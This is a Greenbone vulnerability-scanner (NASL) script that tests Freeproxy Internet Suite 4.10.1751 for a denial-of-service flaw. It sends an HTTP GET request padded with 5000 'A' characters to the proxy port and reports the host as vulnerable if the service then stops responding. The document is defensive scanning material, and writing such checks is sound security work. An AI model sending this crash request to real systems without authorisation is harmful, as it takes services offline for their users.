# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:freeproxy_internet_suite:freeproxy";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806895");
  script_version("2025-03-20T05:38:32+0000");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"2025-03-20 05:38:32 +0000 (Thu, 20 Mar 2025)");
  script_tag(name:"creation_date", value:"2016-05-17 11:03:06 +0530 (Tue, 17 May 2016)");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_name("Freeproxy Internet Suite DoS Vulnerability");

  script_tag(name:"summary", value:"Freeproxy Internet Suite is prone to a denial of service (DoS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted request via HTTP GET and check whether it is
  able to crash the application.");

  script_tag(name:"insight", value:"The flaw is due to improper validation of GET requests to the
  proxy.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to cause the
  application to crash, creating a denial-of-service condition.");

  script_tag(name:"affected", value:"Freeproxy Internet Suite 4.10.1751.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39517/");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("gb_freeproxy_internet_suite_detect.nasl");
  script_mandatory_keys("Freeproxy/installed");
  script_require_ports("Services/www", 8080);

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

if(http_is_dead(port:port))
  exit(0);

junk = crap(data:"A", length:5000);

useragent = http_get_user_agent();

req = 'GET http://::../' + junk + '/index.html HTTP/1.1\r\n' +
      'Host: www.xyz.com\r\n' +
      'User-Agent: ' + useragent + '\r\n' +
      '\r\n\r\n';
http_keepalive_send_recv(port:port, data:req);

sleep(3);

if(http_is_dead(port:port)) {
  security_message(port:port);
  exit(0);
}

exit(99);
